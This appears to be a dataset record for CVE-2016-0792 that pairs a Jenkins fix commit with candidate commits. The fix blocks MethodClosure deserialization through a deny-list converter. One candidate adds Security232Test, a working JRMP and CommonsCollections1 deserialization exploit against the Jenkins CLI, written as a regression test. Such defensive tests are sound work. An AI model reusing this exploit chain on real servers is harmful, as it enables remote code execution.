{
  "cve_id": "CVE-2016-0792",
  "cve_desc": "Multiple unspecified API endpoints in Jenkins before 1.650 and LTS before 1.642.2 allow remote authenticated users to execute arbitrary code via serialized data in an XML file, related to XStream and groovy.util.Expando.",
  "repo": "jenkinsci/jenkins",
  "patch_hash": "18cc8e0eb7d8c9910ce8ce2a9c8dab4c4df8b9c2",
  "patch_info": {
    "commit_hash": "18cc8e0eb7d8c9910ce8ce2a9c8dab4c4df8b9c2",
    "repo": "jenkinsci/jenkins",
    "commit_url": "https://github.com/jenkinsci/jenkins/commit/18cc8e0eb7d8c9910ce8ce2a9c8dab4c4df8b9c2",
    "files": [
      "core/src/main/java/hudson/util/XStream2.java",
      "test/src/test/java/hudson/util/XStream2Security247Test.java",
      "test/src/test/resources/hudson/util/XStream2Security247Test/config.xml"
    ],
    "message": "[FIX SECURITY-247] Prevent loading of MethodClosure from XML",
    "before_after_code_files": [
      "core/src/main/java/hudson/util/XStream2.java||core/src/main/java/hudson/util/XStream2.java",
      "test/src/test/java/hudson/util/XStream2Security247Test.java||test/src/test/java/hudson/util/XStream2Security247Test.java"
    ]
  },
  "patch_diff": {
    "core/src/main/java/hudson/util/XStream2.java||core/src/main/java/hudson/util/XStream2.java": [
      "File: core/src/main/java/hudson/util/XStream2.java -> core/src/main/java/hudson/util/XStream2.java",
      "--- Hunk 1 ---",
      "[Context before]",
      "160:         registerConverter(new AssociatedConverterImpl(this), -10);",
      "162:         registerConverter(new DynamicProxyConverter(getMapper()) { // SECURITY-105 defense",
      "163:             @Override public boolean canConvert(Class type) {",
      "164:                 return /* this precedes NullConverter */ type != null && super.canConvert(type);",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "162:         registerConverter(new BlacklistedTypesConverter(), PRIORITY_VERY_HIGH); // SECURITY-247 defense",
      "",
      "---------------",
      "--- Hunk 2 ---",
      "[Context before]",
      "435:     }",
      "437: }",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "439:     private static class BlacklistedTypesConverter implements Converter {",
      "440:         @Override",
      "441:         public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {",
      "442:             throw new UnsupportedOperationException(\"Cannot marshal MethodClosure\");",
      "443:         }",
      "445:         @Override",
      "446:         public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {",
      "447:             throw new ConversionException(\"Cannot load MethodClosure for security reasons\");",
      "448:         }",
      "450:         @Override",
      "451:         public boolean canConvert(Class type) {",
      "452:             return type != null && \"org.codehaus.groovy.runtime.MethodClosure\".equals(type.getName());",
      "453:         }",
      "454:     }",
      "",
      "---------------"
    ],
    "test/src/test/java/hudson/util/XStream2Security247Test.java||test/src/test/java/hudson/util/XStream2Security247Test.java": [
      "File: test/src/test/java/hudson/util/XStream2Security247Test.java -> test/src/test/java/hudson/util/XStream2Security247Test.java",
      "--- Hunk 1 ---",
      "[Context before]",
      "[No context available]",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "1: package hudson.util;",
      "3: import hudson.Functions;",
      "4: import hudson.model.Items;",
      "5: import org.apache.commons.io.FileUtils;",
      "6: import org.junit.Rule;",
      "7: import org.junit.Test;",
      "8: import org.jvnet.hudson.test.Issue;",
      "9: import org.jvnet.hudson.test.JenkinsRule;",
      "11: import java.io.File;",
      "13: import static org.junit.Assert.assertFalse;",
      "15: public class XStream2Security247Test {",
      "17:     @Rule",
      "18:     public JenkinsRule j = new JenkinsRule();",
      "20:     @Test",
      "21:     @Issue(\"SECURITY-247\")",
      "22:     public void dontUnmarshalMethodClosure() throws Exception {",
      "23:         if (Functions.isWindows())  return;",
      "24:         File exploitFile = new File(\"/tmp/jenkins-security247test\");",
      "25:         try {",
      "27:             if (exploitFile.exists() && !exploitFile.delete()) {",
      "28:                 throw new IllegalStateException(\"file exists and cannot be deleted\");",
      "29:             }",
      "30:             File tempJobDir = new File(j.jenkins.getRootDir(), \"security247\");",
      "31:             FileUtils.copyInputStreamToFile(XStream2Security247Test.class.getResourceAsStream(\"/hudson/util/XStream2Security247Test/config.xml\"),",
      "32:                     new File(tempJobDir, \"config.xml\"));",
      "33:             try {",
      "34:                 Items.load(j.jenkins, tempJobDir);",
      "35:             } catch (Exception e) {",
      "37:             }",
      "38:             assertFalse(\"no file should be created here\", exploitFile.exists());",
      "39:         } finally {",
      "40:             exploitFile.delete();",
      "41:         }",
      "42:     }",
      "43: }",
      "",
      "---------------"
    ]
  },
  "candidates": [
    {
      "candidate_hash": "abde9a3f7ca334f1e627ed970df6ffd6c74ce09f",
      "candidate_info": {
        "commit_hash": "abde9a3f7ca334f1e627ed970df6ffd6c74ce09f",
        "repo": "jenkinsci/jenkins",
        "commit_url": "https://github.com/jenkinsci/jenkins/commit/abde9a3f7ca334f1e627ed970df6ffd6c74ce09f",
        "files": [
          "changelog.html"
        ],
        "message": "1.650 security fixes",
        "before_after_code_files": [
          "changelog.html||changelog.html"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_pr": 1,
        "olp_pr_links": [
          "https://github.com/jenkinsci/jenkins/pull/2063"
        ],
        "olp_code_files": {
          "patch": [],
          "candidate": []
        }
      },
      "candidate_diff": {
        "changelog.html||changelog.html": [
          "File: changelog.html -> changelog.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "60: </div><!--=TRUNK-END=-->",
          "61: <h3><a name=v1.650>What's new in 1.650</a> (2016/02/24)</h3>",
          "62: <ul class=image>",
          "64: </ul>",
          "65: <h3><a name=v1.649>What's new in 1.649</a> (2016/02/21)</h3>",
          "66: <ul class=image>",
          "",
          "[Removed Lines]",
          "63:   <li class=>",
          "",
          "[Added Lines]",
          "63:    <li class=\"major bug\">",
          "64:      <strong>Important security fixes</strong>",
          "65:      (<a href=\"https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2016-02-24\">security advisory</a>)",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "1ec232ca1c80e924d70212313b852aec408aa37e",
      "candidate_info": {
        "commit_hash": "1ec232ca1c80e924d70212313b852aec408aa37e",
        "repo": "jenkinsci/jenkins",
        "commit_url": "https://github.com/jenkinsci/jenkins/commit/1ec232ca1c80e924d70212313b852aec408aa37e",
        "files": [
          "pom.xml",
          "test/src/test/java/jenkins/security/Security232Test.java"
        ],
        "message": "[FIXED SECURITY-232] Integrating Remoting build with blacklist.",
        "before_after_code_files": [
          "test/src/test/java/jenkins/security/Security232Test.java||test/src/test/java/jenkins/security/Security232Test.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_pr": 1,
        "olp_pr_links": [
          "https://github.com/jenkinsci/jenkins/pull/2063"
        ],
        "olp_code_files": {
          "patch": [],
          "candidate": []
        }
      },
      "candidate_diff": {
        "test/src/test/java/jenkins/security/Security232Test.java||test/src/test/java/jenkins/security/Security232Test.java": [
          "File: test/src/test/java/jenkins/security/Security232Test.java -> test/src/test/java/jenkins/security/Security232Test.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: package jenkins.security;",
          "3: import hudson.remoting.Callable;",
          "4: import hudson.remoting.Channel;",
          "5: import hudson.remoting.Channel.Mode;",
          "6: import hudson.remoting.ChannelBuilder;",
          "7: import hudson.remoting.ClassFilter;",
          "8: import hudson.remoting.JarLoader;",
          "9: import java.io.DataOutputStream;",
          "10: import java.io.File;",
          "11: import java.io.IOException;",
          "12: import java.io.ObjectOutputStream;",
          "13: import java.io.OutputStream;",
          "14: import java.lang.reflect.Constructor;",
          "15: import java.lang.reflect.Field;",
          "16: import java.lang.reflect.InvocationHandler;",
          "17: import java.lang.reflect.Method;",
          "18: import java.lang.reflect.Proxy;",
          "19: import java.net.HttpURLConnection;",
          "20: import java.net.InetSocketAddress;",
          "21: import java.net.Socket;",
          "22: import java.net.URL;",
          "23: import java.net.URLClassLoader;",
          "24: import java.rmi.activation.ActivationDesc;",
          "25: import java.rmi.activation.ActivationID;",
          "26: import java.rmi.activation.ActivationInstantiator;",
          "27: import java.rmi.server.ObjID;",
          "28: import java.rmi.server.RemoteObject;",
          "29: import java.rmi.server.UnicastRemoteObject;",
          "30: import java.util.concurrent.ExecutorService;",
          "31: import java.util.concurrent.Executors;",
          "32: import javax.net.SocketFactory;",
          "33: import static jenkins.security.security218.Payload.CommonsCollections1;",
          "34: import jenkins.security.security218.ysoserial.payloads.CommonsCollections1;",
          "35: import jenkins.security.security218.ysoserial.payloads.ObjectPayload;",
          "36: import static org.junit.Assert.*;",
          "37: import org.junit.Rule;",
          "38: import org.junit.Test;",
          "39: import org.jvnet.hudson.test.Issue;",
          "40: import org.jvnet.hudson.test.JenkinsRule;",
          "41: import sun.reflect.ReflectionFactory;",
          "42: import sun.rmi.server.ActivationGroupImpl;",
          "43: import sun.rmi.server.UnicastRef2;",
          "44: import sun.rmi.server.Util;",
          "45: import sun.rmi.transport.LiveRef;",
          "46: import sun.rmi.transport.TransportConstants;",
          "47: import sun.rmi.transport.tcp.TCPEndpoint;",
          "52: @Issue(\"SECURITY-232\")",
          "53: public class Security232Test {",
          "55:     @Rule",
          "56:     public JenkinsRule r = new JenkinsRule();",
          "58:     @Test",
          "59:     public void commonsCollections1() throws Exception {",
          "60:         File pwned = new File(r.jenkins.getRootDir(), \"pwned\");",
          "62:         int jrmpPort = 12345;",
          "63:         URL u = r.getURL();",
          "65:         HttpURLConnection hc = (HttpURLConnection) u.openConnection();",
          "66:         int clip = Integer.parseInt(hc.getHeaderField(\"X-Jenkins-CLI-Port\"));",
          "68:         InetSocketAddress isa = new InetSocketAddress(u.getHost(), clip);",
          "69:         Socket s = null;",
          "70:         Channel c = null;",
          "71:         try {",
          "72:             System.err.println(\"* Opening socket \" + isa);",
          "73:             s = SocketFactory.getDefault().createSocket(isa.getAddress(), isa.getPort());",
          "74:             s.setKeepAlive(true);",
          "75:             s.setTcpNoDelay(true);",
          "77:             System.err.println(\"* Opening channel\");",
          "78:             OutputStream outputStream = s.getOutputStream();",
          "80:             DataOutputStream dos = new DataOutputStream(outputStream);",
          "82:             dos.writeUTF(\"Protocol:CLI-connect\");",
          "84:             ExecutorService cp = Executors.newCachedThreadPool();",
          "85:             c = new ChannelBuilder(\"EXPLOIT\", cp).withMode(Mode.BINARY).build(s.getInputStream(), outputStream);",
          "87:             System.err.println(\"* Channel open\");",
          "89:             Class<?> reqClass = Class.forName(\"hudson.remoting.RemoteInvocationHandler$RPCRequest\");",
          "91:             Constructor<?> reqCons = reqClass.getDeclaredConstructor(int.class, Method.class, Object[].class);",
          "92:             reqCons.setAccessible(true);",
          "94:             Object getJarLoader = reqCons",
          "95:                     .newInstance(1, Class.forName(\"hudson.remoting.IChannel\").getMethod(\"getProperty\", Object.class), new Object[] {",
          "96:                         JarLoader.class.getName() + \".ours\"",
          "97:             });",
          "99:             Object call = c.call((Callable<Object,Exception>) getJarLoader);",
          "100:             InvocationHandler remote = Proxy.getInvocationHandler(call);",
          "101:             Class<?> rih = Class.forName(\"hudson.remoting.RemoteInvocationHandler\");",
          "102:             Field oidF = rih.getDeclaredField(\"oid\");",
          "103:             oidF.setAccessible(true);",
          "104:             int oid = oidF.getInt(remote);",
          "106:             System.err.println(\"* JarLoader oid is \" + oid);",
          "108:             Constructor<UnicastRemoteObject> uroC = UnicastRemoteObject.class.getDeclaredConstructor();",
          "109:             uroC.setAccessible(true);",
          "110:             ReflectionFactory rf = ReflectionFactory.getReflectionFactory();",
          "111:             Constructor<?> sc = rf.newConstructorForSerialization(ActivationGroupImpl.class, uroC);",
          "112:             sc.setAccessible(true);",
          "113:             UnicastRemoteObject uro = (UnicastRemoteObject) sc.newInstance();",
          "115:             Field portF = UnicastRemoteObject.class.getDeclaredField(\"port\");",
          "116:             portF.setAccessible(true);",
          "117:             portF.set(uro, jrmpPort);",
          "118:             Field f = RemoteObject.class.getDeclaredField(\"ref\");",
          "119:             f.setAccessible(true);",
          "120:             f.set(uro, new UnicastRef2(new LiveRef(new ObjID(2), new TCPEndpoint(\"localhost\", 12345), true)));",
          "122:             Object o = reqCons",
          "123:                     .newInstance(oid, JarLoader.class.getMethod(\"isPresentOnRemote\", Class.forName(\"hudson.remoting.Checksum\")), new Object[] {",
          "124:                         uro,",
          "125:             });",
          "127:             try {",
          "128:                 c.call((Callable<Object,Exception>) o);",
          "129:             }",
          "130:             catch ( Exception e ) {",
          "134:                 e.printStackTrace();",
          "136:                 String msg = e.getMessage();",
          "137:                 int start = msg.indexOf(\"objID:[\");",
          "138:                 if ( start < 0 ) {",
          "139:                     return; // good, got blocked before we even got this far",
          "140:                 }",
          "142:                 int sep = msg.indexOf(\", \", start + 1);",
          "144:                 if ( sep < 0 ) {",
          "145:                     throw new Exception(\"Failed to get object id, separator\");",
          "146:                 }",
          "148:                 int end = msg.indexOf(\"]\", sep + 1);",
          "150:                 if ( end < 0 ) {",
          "151:                     throw new Exception(\"Failed to get object id, separator\");",
          "152:                 }",
          "154:                 String uid = msg.substring(start + 7, sep);",
          "155:                 String objNum = msg.substring(sep + 2, end);",
          "157:                 System.err.println(\"* UID is \" + uid);",
          "158:                 System.err.println(\"* ObjNum is \" + objNum);",
          "160:                 String[] parts = uid.split(\":\");",
          "162:                 long obj = Long.parseLong(objNum);",
          "163:                 int o1 = Integer.parseInt(parts[ 0 ], 16);",
          "164:                 long o2 = Long.parseLong(parts[ 1 ], 16);",
          "165:                 short o3 = Short.parseShort(parts[ 2 ], 16);",
          "167:                 exploit(new InetSocketAddress(isa.getAddress(), jrmpPort), obj, o1, o2, o3, new CommonsCollections1(), \"touch \" + pwned);",
          "168:             }",
          "170:             c.close();",
          "171:         }",
          "172:         finally {",
          "173:             if ( s != null ) {",
          "174:                 s.close();",
          "175:             }",
          "176:         }",
          "178:         Thread.sleep(5000);",
          "180:         assertFalse(\"Pwned!\", pwned.exists());",
          "181:     }",
          "192:     private static void exploit ( InetSocketAddress isa, long obj, int o1, long o2, short o3, ObjectPayload payload, String payloadArg )",
          "193:             throws Exception {",
          "194:         Socket s = null;",
          "195:         try {",
          "196:             System.err.println(\"* Opening JRMP socket \" + isa);",
          "197:             s = SocketFactory.getDefault().createSocket(isa.getAddress(), isa.getPort());",
          "198:             s.setKeepAlive(true);",
          "199:             s.setTcpNoDelay(true);",
          "201:             OutputStream os = s.getOutputStream();",
          "202:             DataOutputStream dos = new DataOutputStream(os);",
          "204:             dos.writeInt(TransportConstants.Magic);",
          "205:             dos.writeShort(TransportConstants.Version);",
          "206:             dos.writeByte(TransportConstants.SingleOpProtocol);",
          "208:             dos.write(TransportConstants.Call);",
          "210:             final ObjectOutputStream objOut = new ObjectOutputStream(dos) {",
          "212:                 protected void annotateClass ( Class<?> cl ) throws IOException {",
          "213:                     if ( ! ( cl.getClassLoader() instanceof URLClassLoader ) ) {",
          "214:                         writeObject(null);",
          "215:                     }",
          "216:                     else {",
          "217:                         URL[] us = ( (URLClassLoader) cl.getClassLoader() ).getURLs();",
          "218:                         String cb = \"\";",
          "219:                         for ( URL u : us ) {",
          "220:                             cb += u.toString();",
          "221:                         }",
          "222:                         writeObject(cb);",
          "223:                     }",
          "224:                 }",
          "230:                 protected void annotateProxyClass ( Class<?> cl ) throws IOException {",
          "231:                     annotateClass(cl);",
          "232:                 }",
          "233:             };",
          "235:             objOut.writeLong(obj);",
          "236:             objOut.writeInt(o1);",
          "237:             objOut.writeLong(o2);",
          "238:             objOut.writeShort(o3);",
          "240:             objOut.writeInt(-1);",
          "241:             objOut.writeLong(Util.computeMethodHash(ActivationInstantiator.class.getMethod(\"newInstance\", ActivationID.class, ActivationDesc.class)));",
          "243:             System.err.println(\"Running \" + payload + \" against \" + ClassFilter.class.getProtectionDomain().getCodeSource().getLocation());",
          "244:             final Object object = payload.getObject(payloadArg);",
          "245:             objOut.writeObject(object);",
          "247:             os.flush();",
          "248:         }",
          "249:         finally {",
          "250:             if ( s != null ) {",
          "251:                 s.close();",
          "252:             }",
          "253:         }",
          "254:     }",
          "256: }",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "9f475452eb4ad97e960157211cadd402ec6e5e30",
      "candidate_info": {
        "commit_hash": "9f475452eb4ad97e960157211cadd402ec6e5e30",
        "repo": "jenkinsci/jenkins",
        "commit_url": "https://github.com/jenkinsci/jenkins/commit/9f475452eb4ad97e960157211cadd402ec6e5e30",
        "files": [
          "test/src/test/java/hudson/cli/CLIRegistererTest.java",
          "test/src/test/java/hudson/cli/GroovyshCommandTest.java",
          "test/src/test/java/hudson/cli/HelpCommandTest.java",
          "war/pom.xml"
        ],
        "message": "Reverting merge of #1301 as well as mistaken follow-up 1e804fdf2746e224d175d2de764111aa22860a25. The root problem was missing <scope>test</scope> in domain-discovery.",
        "before_after_code_files": [
          "test/src/test/java/hudson/cli/CLIRegistererTest.java||test/src/test/java/hudson/cli/CLIRegistererTest.java",
          "test/src/test/java/hudson/cli/GroovyshCommandTest.java||test/src/test/java/hudson/cli/GroovyshCommandTest.java",
          "test/src/test/java/hudson/cli/HelpCommandTest.java||test/src/test/java/hudson/cli/HelpCommandTest.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_pr": 1,
        "olp_pr_links": [
          "https://github.com/jenkinsci/jenkins/pull/2063"
        ],
        "olp_code_files": {
          "patch": [],
          "candidate": []
        }
      },
      "candidate_diff": {
        "test/src/test/java/hudson/cli/CLIRegistererTest.java||test/src/test/java/hudson/cli/CLIRegistererTest.java": [
          "File: test/src/test/java/hudson/cli/CLIRegistererTest.java -> test/src/test/java/hudson/cli/CLIRegistererTest.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "3: import static hudson.cli.CLICommandInvoker.Matcher.failedWith;",
          "4: import static hudson.cli.CLICommandInvoker.Matcher.succeededSilently;",
          "5: import static org.hamcrest.MatcherAssert.assertThat;",
          "7: import static org.hamcrest.CoreMatchers.is;",
          "9: import jenkins.model.Jenkins;",
          "",
          "[Removed Lines]",
          "6: import static org.hamcrest.Matchers.containsString;",
          "",
          "[Added Lines]",
          "6: import static org.hamcrest.CoreMatchers.containsString;",
          "",
          "---------------"
        ],
        "test/src/test/java/hudson/cli/GroovyshCommandTest.java||test/src/test/java/hudson/cli/GroovyshCommandTest.java": [
          "File: test/src/test/java/hudson/cli/GroovyshCommandTest.java -> test/src/test/java/hudson/cli/GroovyshCommandTest.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "27: import static hudson.cli.CLICommandInvoker.Matcher.*;",
          "28: import jenkins.model.Jenkins;",
          "29: import org.apache.tools.ant.filters.StringInputStream;",
          "31: import static org.junit.Assert.*;",
          "32: import org.junit.Rule;",
          "33: import org.junit.Test;",
          "",
          "[Removed Lines]",
          "30: import static org.hamcrest.Matchers.containsString;",
          "",
          "[Added Lines]",
          "30: import static org.hamcrest.CoreMatchers.containsString;",
          "",
          "---------------"
        ],
        "test/src/test/java/hudson/cli/HelpCommandTest.java||test/src/test/java/hudson/cli/HelpCommandTest.java": [
          "File: test/src/test/java/hudson/cli/HelpCommandTest.java -> test/src/test/java/hudson/cli/HelpCommandTest.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "27: import static hudson.cli.CLICommandInvoker.Matcher.*;",
          "28: import static org.junit.Assert.*;",
          "29: import static org.hamcrest.CoreMatchers.*;",
          "31: import static org.hamcrest.text.StringContainsInOrder.stringContainsInOrder;",
          "33: import java.io.PrintStream;",
          "",
          "[Removed Lines]",
          "30: import static org.hamcrest.Matchers.*;",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "281cd6c69a8af6a8b898b8011fb5bda6d3fcbbfb",
      "candidate_info": {
        "commit_hash": "281cd6c69a8af6a8b898b8011fb5bda6d3fcbbfb",
        "repo": "jenkinsci/jenkins",
        "commit_url": "https://github.com/jenkinsci/jenkins/commit/281cd6c69a8af6a8b898b8011fb5bda6d3fcbbfb",
        "files": [
          "core/src/main/java/hudson/security/csrf/DefaultCrumbIssuer.java"
        ],
        "message": "[SECURITY-245] Add explanation comment",
        "before_after_code_files": [
          "core/src/main/java/hudson/security/csrf/DefaultCrumbIssuer.java||core/src/main/java/hudson/security/csrf/DefaultCrumbIssuer.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 1,
        "same_pr": 1,
        "olp_pr_links": [
          "https://github.com/jenkinsci/jenkins/pull/2063"
        ],
        "olp_code_files": {
          "patch": [],
          "candidate": []
        }
      },
      "candidate_diff": {
        "core/src/main/java/hudson/security/csrf/DefaultCrumbIssuer.java||core/src/main/java/hudson/security/csrf/DefaultCrumbIssuer.java": [
          "File: core/src/main/java/hudson/security/csrf/DefaultCrumbIssuer.java -> core/src/main/java/hudson/security/csrf/DefaultCrumbIssuer.java"
        ]
      }
    },
    {
      "candidate_hash": "f5c51fbad2b62b81dc1e0402aeee058a4a478046",
      "candidate_info": {
        "commit_hash": "f5c51fbad2b62b81dc1e0402aeee058a4a478046",
        "repo": "jenkinsci/jenkins",
        "commit_url": "https://github.com/jenkinsci/jenkins/commit/f5c51fbad2b62b81dc1e0402aeee058a4a478046",
        "files": [
          "core/src/main/java/hudson/cli/CLIAction.java"
        ],
        "message": "[FIX SECURITY-238] Don't echo command name",
        "before_after_code_files": [
          "core/src/main/java/hudson/cli/CLIAction.java||core/src/main/java/hudson/cli/CLIAction.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 1,
        "same_pr": 1,
        "olp_pr_links": [
          "https://github.com/jenkinsci/jenkins/pull/2063"
        ],
        "olp_code_files": {
          "patch": [],
          "candidate": []
        }
      },
      "candidate_diff": {
        "core/src/main/java/hudson/cli/CLIAction.java||core/src/main/java/hudson/cli/CLIAction.java": [
          "File: core/src/main/java/hudson/cli/CLIAction.java -> core/src/main/java/hudson/cli/CLIAction.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "78:         final String commandName = req.getRestOfPath().substring(1);",
          "79:         CLICommand command = CLICommand.clone(commandName);",
          "80:         if (command == null) {",
          "82:             return;",
          "83:         }",
          "",
          "[Removed Lines]",
          "81:             rsp.sendError(HttpServletResponse.SC_NOT_FOUND, \"No such command \" + commandName);",
          "",
          "[Added Lines]",
          "81:             rsp.sendError(HttpServletResponse.SC_NOT_FOUND, \"No such command\");",
          "",
          "---------------"
        ]
      }
    }
  ]
}